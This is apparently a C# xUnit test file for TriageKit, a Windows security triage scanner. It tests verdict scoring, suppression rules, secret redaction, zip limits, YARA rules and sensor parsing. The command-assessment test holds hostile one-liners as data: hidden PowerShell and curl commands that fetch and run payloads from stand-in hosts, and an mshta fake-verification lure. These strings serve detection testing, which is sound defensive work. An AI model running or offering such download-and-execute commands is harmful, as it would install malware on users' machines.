using System.IO.Compression;
using System.Text;
using TriageKit.Core.Checks;
using TriageKit.Core.Engine;
using TriageKit.Core.Reporting;
using TriageKit.Core.Yara;
using Xunit;

namespace TriageKit.Tests;

public class V11Tests
{
    private static Finding F(Severity s, string rule, string title, string detail = "", object? ev = null) => new() { Severity = s, Category = "X", Title = title, RuleId = rule, Detail = detail, Evidence = ev };

    [Fact]
    public void GapsNeverGiveAGreenAllClear()
    {
        var gaps = new[] { F(Severity.Info, "collector.failed", "Check could not complete: X"), F(Severity.Info, "collector.not-admin", "Not admin") };
        var (score, verdict) = Scoring.Calculate(gaps);
        Assert.Equal("Incomplete check", verdict);
        Assert.True(score <= 84);
        Assert.Equal("Looks clean", Scoring.Calculate(new[] { F(Severity.Info, "info.x", "Fine") }).Verdict);
        // Real problems still win over "incomplete"
        Assert.Equal("Likely compromised", Scoring.Calculate(gaps.Append(F(Severity.Critical, "yara.x", "Bad"))).Verdict);
    }

    [Fact]
    public void FolderExclusionStopsAtTheFolderBoundary()
    {
        var set = new SuppressionSet { Items = { new Suppression { Path = @"D:\Games" } } };
        var applied = set.Apply(new[]
        {
            F(Severity.High, "autostart.unsigned", "In folder", @"D:\Games\launcher.exe"),
            F(Severity.High, "autostart.unsigned", "Look-alike folder", @"D:\GamesEvil\x.exe"),
            F(Severity.High, "process.cmdline", "Mentions it", "cmd /c copy D:\\Games\\a.txt C:\\Temp\\b.exe"),
            F(Severity.Medium, "x.y", "Evidence path", "", new { Path = @"D:\Games\sub\tool.exe" }),
        });
        Assert.True(applied[0].Accepted);
        Assert.False(applied[1].Accepted);
        Assert.False(applied[2].Accepted);
        Assert.True(applied[3].Accepted);
    }

    [Fact]
    public void AcceptedFindingsAreAlwaysAnnounced()
    {
        var mine = F(Severity.Medium, "defender.exclusion", "My exclusion");
        var checks = new ICheck[] { new ProbeCheck(ctx => { ctx.Add(Severity.Medium, "X", "My exclusion", ruleId: "defender.exclusion"); return 1; }) };
        var opts = new ScanOptions { Suppressions = new SuppressionSet { Items = { new Suppression { RuleId = "defender.exclusion" } } } };
        var r = new Scanner(checks).Run(new CheckContext(opts, TriageKit.Core.Rules.Indicators.LoadBuiltIn(), new TriageKit.Core.Intel.FileIntelService()), new ScanMeta());
        Assert.Contains(r.Findings, f => f.RuleId == "collector.accepted");
    }

    private sealed class ProbeCheck : ICheck
    {
        private readonly Func<CheckContext, object?> _f; public ProbeCheck(Func<CheckContext, object?> f) => _f = f;
        public string Name => "probe"; public object? Run(CheckContext ctx) => _f(ctx);
    }

    [Fact]
    public void ShareableReportRemovesSecretsInCommandsAndLinks()
    {
        var r = new ScanResult { Meta = new ScanMeta { ComputerName = "PC1", Operator = "u" } };
        r.Findings.Add(F(Severity.High, "p", "Process",
            "net use \\\\NAS-SMITHFAMILY\\taxes /user:acme\\jsmith Hunter2pass && curl https://discord.com/api/webhooks/123/abcSECRET?x=1 --password=s3cr3t token=XYZ123"));
        var json = ReportWriter.ToJson(Redactor.Redact(r));
        foreach (var leak in new[] { "NAS-SMITHFAMILY", "jsmith", "Hunter2pass", "abcSECRET", "s3cr3t", "XYZ123", "webhooks/123" })
            Assert.DoesNotContain(leak, json);
        Assert.Contains("discord.com", json);   // the site name stays useful
    }

    [Fact]
    public void ZipWithTooManyEntriesIsRefusedUpFront()
    {
        var ms = new MemoryStream();
        using (var z = new ZipArchive(ms, ZipArchiveMode.Create, true)) for (int i = 0; i < ZipContents.MaxEntries + 5; i++) z.CreateEntry("e" + i, CompressionLevel.NoCompression);
        ms.Position = 0;
        Assert.Equal(ZipContents.MaxEntries + 5, ZipContents.DeclaredEntries(ms));
        var budget = new ZipContents.Budget();
        Assert.Empty(ZipContents.Read(ms, _ => true, budget, default).ToList());
        Assert.True(budget.LimitHit);
        Assert.Equal(0, budget.Entries);   // never started building the entry list
    }

    [Theory]
    [InlineData("powershell -w hidden -c \"iwr https://evil.example/a.ps1 | iex\"", Severity.High)]
    [InlineData("mshta https://evil.example/v.hta # I am not a robot - Verification ID: 4821", Severity.High)]
    [InlineData("cmd /c curl -s https://x.example/p -o %TEMP%\\p.exe & start %TEMP%\\p.exe", Severity.High)]
    [InlineData("notepad", null)]
    [InlineData("cmd", null)]
    [InlineData("\\\\server\\share", null)]
    public void PastedCommandsAreJudged(string cmd, Severity? expected) => Assert.Equal(expected, RunHistoryCheck.Assess(cmd));
}

public class LabFindingsTests
{
    [Fact]
    public void DefenderThatCannotScanIsNotAThreat()
    {
        // Windows Sandbox: Defender is off, MpCmdRun exits with 2 but names no threat.
        var off = TriageKit.Core.Reputation.DefenderFileScanProvider.Parse(2, "CmdTool: Failed with hr = 0x800106BA. Check C:\\...\\MpCmdRun.log for more information", Array.Empty<string>());
        Assert.NotEqual(TriageKit.Core.Reputation.Verdict.Malicious, off.Verdict);
        var hit = TriageKit.Core.Reputation.DefenderFileScanProvider.Parse(2, "Scanning C:\\x.exe found 1 threats.\nThreat                  : Trojan:Win32/Wacatac.B!ml", Array.Empty<string>());
        Assert.Equal(TriageKit.Core.Reputation.Verdict.Malicious, hit.Verdict);
        Assert.Equal("Trojan:Win32/Wacatac.B!ml", hit.Label);
    }

    [Fact]
    public void OwnUnpackedLibrariesAreSelf()
    {
        var p = Path.Combine(Path.GetTempPath(), ".net", "TriageKit", "abc123", "e_sqlite3.dll");
        Assert.True(TriageKit.Core.Intel.SelfIdentity.IsSelf(p));
        Assert.False(TriageKit.Core.Intel.SelfIdentity.IsSelf(Path.Combine(Path.GetTempPath(), ".net", "OtherApp", "e_sqlite3.dll")));
    }

    [Fact]
    public void EicarRuleMatchesTheTestFile()
    {
        var rules = TriageKit.Core.Yara.YaraRuleSet.LoadBuiltIn();
        var eicar = Encoding.ASCII.GetBytes("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");
        Assert.Contains(new TriageKit.Core.Yara.YaraScanner(rules).Scan(eicar), m => m.Rule.Name == "Test_EICAR");
    }
}

public class DoctorTwoTests
{
    private static CheckContext Ctx() => new(new ScanOptions(), TriageKit.Core.Rules.Indicators.LoadBuiltIn(), new TriageKit.Core.Intel.FileIntelService());
    private static SensorsCheck.Reading R(string label, string kind, double v, double? min = null, double? max = null) => new("HWiNFO", "Board", label, kind, v, min, max, "");

    [Fact]
    public void HwinfoSharedMemoryLayoutIsParsed()
    {
        // Build a tiny HWiNFO_SENS_SM2 image: header, one sensor, two readings.
        const int sensorSize = 264, readingSize = 316, offSensor = 44, offRead = offSensor + sensorSize;
        var buf = new byte[offRead + 2 * readingSize];
        void U32(int at, uint v) => BitConverter.GetBytes(v).CopyTo(buf, at);
        void Txt(int at, string s) => Encoding.Latin1.GetBytes(s).CopyTo(buf, at);
        void Dbl(int at, double v) => BitConverter.GetBytes(v).CopyTo(buf, at);
        U32(0, 0x53695748); U32(20, offSensor); U32(24, sensorSize); U32(28, 1); U32(32, offRead); U32(36, readingSize); U32(40, 2);
        Txt(offSensor + 8, "ASUS ROG STRIX B650E (Nuvoton NCT6799D)");
        int r0 = offRead; U32(r0, 2); U32(r0 + 4, 0); Txt(r0 + 12, "+12V"); Txt(r0 + 268, "V"); Dbl(r0 + 284, 12.1); Dbl(r0 + 292, 11.9); Dbl(r0 + 300, 12.2); Dbl(r0 + 308, 12.05);
        int r1 = offRead + readingSize; U32(r1, 1); U32(r1 + 4, 0); Txt(r1 + 12, "CPU Package"); Txt(r1 + 140, "CPU Temp"); Txt(r1 + 268, "°C"); Dbl(r1 + 284, 55);
        using var mmf = System.IO.MemoryMappedFiles.MemoryMappedFile.CreateNew(null, buf.Length);
        using (var w = mmf.CreateViewAccessor()) w.WriteArray(0, buf, 0, buf.Length);
        using var v = mmf.CreateViewAccessor(0, buf.Length, System.IO.MemoryMappedFiles.MemoryMappedFileAccess.Read);
        var list = SensorsCheck.ParseHwinfo(v)!;
        Assert.Equal(2, list.Count);
        Assert.Equal(("+12V", "Voltage", 12.1, 11.9, 12.2), (list[0].Label, list[0].Kind, list[0].Value, list[0].Min!.Value, list[0].Max!.Value));
        Assert.Equal(12.05, list[0].Avg);
        Assert.Equal("CPU Temp", list[1].Label);   // the user's own label wins
        Assert.StartsWith("ASUS ROG STRIX", list[0].Group);
    }

    [Fact]
    public void AntiVmRuleNeedsSeveralSigns()
    {
        var scanner = new TriageKit.Core.Yara.YaraScanner(TriageKit.Core.Yara.YaraRuleSet.LoadBuiltIn());
        byte[] Pe(string body) => new byte[] { (byte)'M', (byte)'Z' }.Concat(new byte[62]).Concat(Encoding.ASCII.GetBytes(body)).ToArray();
        Assert.Contains(scanner.Scan(Pe("VBoxService..vmtoolsd..SbieDll.dll")), m => m.Rule.Name == "Evasion_AntiVM_AntiSandbox");
        Assert.DoesNotContain(scanner.Scan(Pe("VMware Tools installer")), m => m.Rule.Name == "Evasion_AntiVM_AntiSandbox");
    }
}
